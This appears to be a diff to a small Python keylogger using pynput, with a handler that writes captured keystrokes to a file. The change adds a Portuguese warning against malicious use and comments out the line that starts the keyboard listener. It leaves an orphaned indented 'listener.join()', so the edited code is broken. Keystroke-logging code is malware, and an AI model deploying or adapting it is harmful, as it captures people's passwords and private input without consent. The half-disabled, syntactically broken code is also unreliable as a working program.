@@ -1,5 +1,7 @@
 from pynput import keyboard
 
+# Não utilize este código para fins maliciosos e jamais o execute fora de uma máquina virtual. Algumas partes foram comentadas por questões de segurança.
+
 ignorar = {
     keyboard.Key.shift,
     keyboard.Key.shift_r,
@@ -33,5 +35,6 @@ def on_press(key):
             else:
                 f.write(f"[{key}]")
 
-with keyboard.Listener(on_press=on_press) as listener:
+#with keyboard.Listener(on_press=on_press) as listener:
+#listener.join()
     listener.join()
